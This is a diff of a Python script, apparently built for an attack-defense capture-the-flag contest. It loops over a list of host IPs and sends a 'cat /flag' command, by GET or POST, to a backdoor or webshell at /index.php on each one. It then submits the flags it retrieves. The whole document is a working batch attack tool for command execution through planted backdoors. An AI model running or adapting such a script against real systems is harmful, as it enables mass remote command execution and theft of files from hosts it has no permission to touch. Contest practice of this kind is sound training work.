@@ -1,20 +1,34 @@
 import sys
+from plugin.attack import *
+from plugin.submit_flag import *
+
+
 def loadfile(filepath):
-	try : 
-		file = open(filepath,"rb")
-		return str(file.read())
-	except : 
-		print("找不到文件："+ filepath)
-		sys.exit()
+    try:
+        file = open(filepath, "r")
+        return str(file.read())
+    except:
+        print("找不到文件：" + filepath)
+        sys.exit()
 
 
 if __name__ == '__main__':
-	while True:
-		ms = raw_input("Attack Method > ")
-		shellstr=loadfile("./webshell.txt")
-		list = shellstr.split("\r\n")
-		#print str(list)
-		i = 0
-		url={}
-		passwd={}
-		method={}
+
+    ## get方法payload ####
+    url_path = '/index.php'
+    method = 'get'
+    payload = '?copyright=cat /flag'
+    #####################
+    ## post 方法payload ##
+    # url_path = 'index.php'
+    # method = 'post'
+    # payload = {'pass': 'password', 'cmd': 'cat /flag'}
+    #####################
+    ip_txt = loadfile("./host_list.txt")
+    print(ip_txt)
+    ip_list = ip_txt.split("\n")
+    print(ip_list)
+    for ip in ip_list:
+        if ip:
+            flag = backdoor_attack(ip, url_path, method, payload)
+            submit(ip, flag)
